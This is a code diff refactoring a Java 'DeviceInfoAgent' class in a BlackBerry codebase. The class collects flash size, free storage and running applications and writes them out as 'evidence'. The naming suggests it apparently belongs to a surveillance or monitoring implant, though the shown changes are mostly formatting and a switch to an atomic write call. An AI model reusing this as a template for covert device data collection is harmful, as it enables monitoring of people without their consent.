@@ -33,7 +33,6 @@ import blackberry.evidence.EvidenceType;
 import blackberry.fs.Path;
 import blackberry.utils.Check;
 
-
 /**
  * The Class DeviceInfoAgent.
  */
@@ -56,7 +55,8 @@ public final class DeviceInfoAgent extends Agent {
         super(AGENT_DEVICE, agentEnabled, Conf.AGENT_DEVICEINFO_ON_SD,
                 "DeviceInfoAgent");
         //#ifdef DBC
-        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.DEVICE,
+        Check.asserts(
+                Evidence.convertTypeEvidence(agentId) == EvidenceType.DEVICE,
                 "Wrong Conversion");
         //#endif
 
@@ -84,8 +84,6 @@ public final class DeviceInfoAgent extends Agent {
         //#ifdef DBC
         Check.requires(evidence != null, "Null log");
         //#endif
-
-        evidence.createEvidence(null);
 
         boolean ret = true;
 
@@ -176,12 +174,12 @@ public final class DeviceInfoAgent extends Agent {
 
         // DISK
         sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
-        
+
         sb.append("internal space: " + Path.freeSpace(Path.USER) + " Bytes\n");
-        if(Path.isSDAvailable()){
+        if (Path.isSDAvailable()) {
             sb.append("SD space: " + Path.freeSpace(Path.SD) + " Bytes\n");
         }
-        
+
         sb.append(getRunningApplications());
 
         try {
@@ -196,15 +194,8 @@ public final class DeviceInfoAgent extends Agent {
             //#endif
         }
 
-        ret = evidence.writeEvidence(sb.toString(), true);
+        evidence.atomicWriteOnce(sb.toString());
 
-        if (ret == false) {
-            //#ifdef DEBUG
-            debug.error("Error writing file");
-            //#endif
-        }
-
-        evidence.close();
     }
 
     /**
